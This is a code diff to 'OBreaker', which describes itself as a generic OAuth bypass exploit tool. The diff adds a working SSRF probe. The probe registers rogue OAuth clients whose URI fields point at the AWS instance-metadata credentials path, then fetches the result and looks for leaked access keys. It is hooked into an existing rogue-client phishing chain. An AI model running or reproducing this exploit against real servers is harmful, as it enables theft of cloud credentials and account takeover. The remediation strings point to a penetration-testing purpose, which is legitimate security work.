@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-OBreaker v3.2 -- Generic OAuth Authorization Bypass Exploit Tool
+OBreaker v3.3 -- Generic OAuth Authorization Bypass Exploit Tool
 
-Full end-to-end Find, Forge, Fire (FFF) exploitation for 18 OAuth bypass techniques.
+Full end-to-end Find, Forge, Fire (FFF) exploitation for 18 OAuth bypass techniques + DCR SSRF sub-probe.
 Works against ANY OAuth 2.0 / OpenID Connect server, not just specific testbeds.
 
 Modes:
@@ -1488,6 +1488,117 @@ class OAuthBreaker:
             remediation="Validate redirect_uri BEFORE processing prompt=none. RFC 9700 S4.11.2.",
         )
 
+    # ── DCR SSRF sub-probe ─────────────────────────────────────────
+    def _test_dcr_ssrf(self, reg_url: str, base_client_id: str, base_chain: list) -> Optional[Finding]:
+        ssrf_fields = ["logo_uri", "jwks_uri", "sector_identifier_uri", "request_uris"]
+        canary = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+        probe_paths = {
+            "logo_uri": "/client/{cid}/logo",
+            "jwks_uri": None,
+            "sector_identifier_uri": None,
+            "request_uris": None,
+        }
+
+        for ssrf_field in ssrf_fields:
+            payload = {
+                "redirect_uris": ["https://localhost/cb"],
+                "client_name": f"OBreaker SSRF probe ({ssrf_field})",
+                "grant_types": ["authorization_code"],
+                "token_endpoint_auth_method": "none",
+            }
+            if ssrf_field == "request_uris":
+                payload[ssrf_field] = [canary]
+            else:
+                payload[ssrf_field] = canary
+
+            try:
+                r = self._post(reg_url, json=payload)
+            except Exception:
+                continue
+
+            if r.status_code not in (200, 201):
+                continue
+
+            try:
+                data = r.json()
+            except Exception:
+                continue
+
+            cid = data.get("client_id", "")
+            if not cid:
+                continue
+
+            chain = list(base_chain)
+            chain.append(ExploitStep(
+                phase="FORGE",
+                action=f"Registered client with {ssrf_field} pointing to AWS metadata",
+                result=f"client_id={cid}, {ssrf_field}={canary}",
+                request=f"POST {reg_url}",
+                response=f"{r.status_code} client_id={cid}",
+            ))
+
+            fetch_path = probe_paths.get(ssrf_field)
+            if fetch_path:
+                fetch_url = f"{self.cfg.base_url}{fetch_path.format(cid=cid)}"
+                try:
+                    r2 = self._get(fetch_url)
+                    body = r2.text[:500]
+                    if any(kw in body.lower() for kw in ["secretaccesskey", "accesskeyid", "token", "arn:", "security-credentials"]):
+                        chain.append(ExploitStep(
+                            phase="FIRE",
+                            action=f"Fetched {fetch_url} -- server fetched {ssrf_field} server-side",
+                            result=f"SSRF confirmed: response contains cloud metadata",
+                            request=f"GET {fetch_url}",
+                            response=body[:200],
+                        ))
+                        return Finding(
+                            technique="DCR Open Registration", severity="critical",
+                            title=f"SSRF via DCR {ssrf_field} -- cloud metadata exposed",
+                            description=f"Server fetches {ssrf_field} server-side. SSRF to internal services.",
+                            chain=chain,
+                            proof=ExploitProof(
+                                exploited=True,
+                                impact=f"SSRF: {ssrf_field} fetched server-side, leaked cloud credentials.",
+                            ),
+                            remediation=f"Validate {ssrf_field} against allowlist. Block RFC 1918 / link-local.",
+                        )
+                    elif r2.status_code == 200 and len(body) > 10:
+                        chain.append(ExploitStep(
+                            phase="FIRE",
+                            action=f"Fetched {fetch_url} -- server fetched {ssrf_field} server-side",
+                            result=f"SSRF likely: got {len(body)} bytes (check manually)",
+                            request=f"GET {fetch_url}",
+                            response=body[:200],
+                        ))
+                        return Finding(
+                            technique="DCR Open Registration", severity="critical",
+                            title=f"SSRF via DCR {ssrf_field} -- server-side fetch confirmed",
+                            description=f"Server fetches {ssrf_field} server-side. Point to internal services.",
+                            chain=chain,
+                            proof=ExploitProof(
+                                exploited=True,
+                                impact=f"SSRF: {ssrf_field} fetched server-side. Internal network reachable.",
+                            ),
+                            remediation=f"Validate {ssrf_field} against allowlist. Block RFC 1918 / link-local.",
+                        )
+                except Exception:
+                    pass
+
+            chain.append(ExploitStep(
+                phase="FORGE",
+                action=f"{ssrf_field} accepted with internal URL -- potential SSRF",
+                result=f"Server accepted {ssrf_field}={canary} (manual verification needed for fetch endpoint)",
+            ))
+            return Finding(
+                technique="DCR Open Registration", severity="high",
+                title=f"DCR accepts internal URLs in {ssrf_field} -- potential SSRF",
+                description=f"{ssrf_field} not validated. If fetched server-side, SSRF to internal network.",
+                chain=chain,
+                proof=ExploitProof(impact=f"POTENTIAL SSRF: {ssrf_field} accepted with internal URL."),
+                remediation=f"Validate {ssrf_field} against allowlist. Block RFC 1918 / link-local.",
+            )
+        return None
+
     # ── 12. DCR Open Registration ───────────────────────────────────
     def test_dcr_open(self) -> Optional[Finding]:
         url = self.cfg.register_endpoint or self._url("dcr", f"{self.cfg.base_url}/register")
@@ -1527,6 +1638,10 @@ class OAuthBreaker:
                         action="Phish victim via rogue client -> steal code -> exchange -> access",
                         result="Complete phishing chain available via legitimate consent flow",
                     ))
+                    ssrf_finding = self._test_dcr_ssrf(url, rogue_cid, chain)
+                    if ssrf_finding:
+                        return ssrf_finding
+
                     return Finding(
                         technique="DCR Open Registration", severity="critical",
                         title="Unauthenticated client registration -- phishing via consent screen",
@@ -2293,7 +2408,7 @@ class OAuthBreaker:
     def run_all(self) -> list[Finding]:
         mode = "profile" if self.profile else "generic"
         print(f"\n{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
-        print(f"{C.CYAN}{C.BOLD}  |  OBreaker v3.2 -- OAuth Exploit Tool        |{C.RESET}")
+        print(f"{C.CYAN}{C.BOLD}  |  OBreaker v3.3 -- OAuth Exploit Tool        |{C.RESET}")
         print(f"{C.CYAN}{C.BOLD}  |  Find - Forge - Fire (Full Exploitation)    |{C.RESET}")
         print(f"{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
         print(f"\n  {C.DIM}Target:  {self.cfg.base_url}{C.RESET}")
@@ -2446,7 +2561,7 @@ def save_json_report(findings: list[Finding], path: str):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="OBreaker v3.2 -- Generic OAuth Authorization Bypass Exploit Tool",
+        description="OBreaker v3.3 -- Generic OAuth Authorization Bypass Exploit Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
